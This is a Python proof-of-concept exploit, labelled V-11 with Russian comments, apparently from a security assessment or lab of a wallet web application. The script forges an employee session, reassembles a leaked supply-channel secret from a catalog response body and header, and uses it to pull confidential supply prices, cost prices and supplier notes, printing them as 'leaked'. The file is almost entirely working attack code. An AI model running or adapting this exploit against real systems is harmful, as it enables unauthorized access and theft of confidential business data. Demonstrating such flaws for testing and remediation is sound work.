# -*- coding: utf-8 -*-
"""V-11. Утечка себестоимости и поставщиков через supply-channel.

/api/v2/supply/pricing требует заголовок X-Wallet-Channel == supplyChannel(),
но supplyChannel производится от SESSION_KEY и ПОЛНОСТЬЮ отдаётся наружу:
первая половина в meta.ch_pref тела /api/catalog, вторая — в заголовке
X-Wallet-Sync-Part (их склеивает /static/legacy-sync.js). Получаем закрытые
цены поставки, себестоимость и заметки поставщиков.
"""
import json

from wallet_client import Client, parser, supply_channel, banner, ok, fail


def main():
    a = parser("Утечка supply-channel и себестоимости").parse_args()
    c = Client(a.base)
    c.forge(1, "employee")

    st, hdr, body = c.get("/api/catalog")
    tail = hdr.get("X-Wallet-Sync-Part", "")
    pref = json.loads(body.decode("utf-8")).get("meta", {}).get("ch_pref", "")
    channel = pref + tail
    banner(f"канал собран из ответа: {channel}")
    banner(f"канал из SESSION_KEY:    {supply_channel()}")

    st, _, body = c.get("/api/v2/supply/pricing", headers={"X-Wallet-Channel": channel})
    if st != 200:
        fail(f"pricing недоступен: {st}")
    rows = json.loads(body.decode("utf-8"))
    for r in rows:
        banner(f"{r['code']}: цена={r['price_kop']} себестоимость={r['cost_kop']} \"{r['supplier_note']}\"")
    ok("закрытые цены и поставщики слиты через утёкший канал")


if __name__ == "__main__":
    main()
